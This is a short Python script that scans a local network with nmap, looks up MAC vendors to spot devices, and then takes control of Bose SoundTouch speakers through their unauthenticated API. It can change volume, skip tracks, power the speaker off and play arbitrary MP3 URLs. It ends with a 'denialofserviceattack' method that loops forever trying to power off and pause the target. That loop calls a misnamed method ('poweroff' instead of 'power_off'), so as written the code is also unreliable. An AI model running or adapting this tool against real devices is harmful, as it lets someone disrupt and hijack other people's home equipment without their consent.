

try:

    from libsoundtouch import discover_devices
    from libsoundtouch import soundtouch_device
    from libsoundtouch.utils import Source, Type
    import nmap  # import nmap.py module
    import requests
    from getmac import get_mac_address
except:
    print(""" Some of Modules are Missing 
        from libsoundtouch import discover_devices
        from libsoundtouch import soundtouch_device
        from libsoundtouch.utils import Source, Type
        import nmap  # import nmap.py module
        import requests
        from getmac import get_mac_address
    """)

class Bose_Discover(object):

    def __init__(self):
        pass

    def Find_Devices(self):
        self.__Nmap_Scan()

    def __Name(self, Mac=''):

        if len(str(Mac)) <= 2:
            return "Not Found"
        else:
            try:
                Temp = Mac.split(":")
                Temp1 = ''.join(Temp)[0:6]
                url = "https://macvendors.com/query/{}".format(Temp1)
                r = requests.get(url)
                Mac_Name = r.text
            except:
                return "Not Found"

            if len(Mac_Name) > 20:
                Mac_Name = "Not Found"
            else:
                Mac_Name = r.text
        return Mac, Mac_Name

    def __Get_Mac(self, IP='192.168.1.1'):
        mac = get_mac_address(ip=IP)  # using 'get_mac_address' from 'getmac' import
        return mac

    def __Nmap_Scan(self):
        network = input('Enter Routers Default Gateway Address (Default is 192.168.1.1): ')
        if len(network) == 0:
            network = '192.168.1.1/24'
        else:
            network = network + '/24'

        print('Starting Scan .......')
        nm = nmap.PortScanner()

        nm.scan(hosts=network, arguments='-sn')  # define nmap arguments here
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]

        counter = 1

        for host, status in hosts_list:
            mac = self.__Get_Mac(IP=host)
            mac_vendor = self.__Name(Mac=mac)
            counter = counter + 1
            print('Host:{}\tStatus:{}\tMac:{}\tVendor\t{}'.format(host, status, mac, mac_vendor[1]))
        print('Number of hosts found: ' + str(len(hosts_list)))


class Bose_Hack(object):

    def __init__(self, ip=''):
        self.ip = ip
        self.device = soundtouch_device(self.ip)

    def get_current_volume(self):
        return self.device.volume().actual

    def set_volume(self, volume =''):
        self.device.set_volume(volume)
        print("Volume set {}".format(volume))

    def next_track(self):
        self.device.next_track()

    def status(self):
        statusV = self.device.status()
        return statusV.source, statusV.artist, statusV.track

    def pause(self):
        self.device.pause()

    def play(self):
        self.device.play()

    def play_mp3(self, mp3=''):
        self.device.play_url(mp3)

    def playpause(self):
        self.device.play_pause()

    def select_aux(self):
        self.device.select_source_aux()

    def select_bluetooth(self):
        self.device.select_source_bluetooth()


    def poweroff(self):
        self.device.power_off()

    def poweron(self):
        self.device.power_on()

    def denialofserviceattack(self):
        while True:
            print("Dos Attack on {}".format(self.ip))
            self.device.poweroff()
            self.device.pause()


D = Bose_Discover()
print(D.Find_Devices())

c = Bose_Hack(ip="IP ADDRESS GOES HERE ")
print(c.status())
print(c.next_track())
print(c.denialofserviceattack())
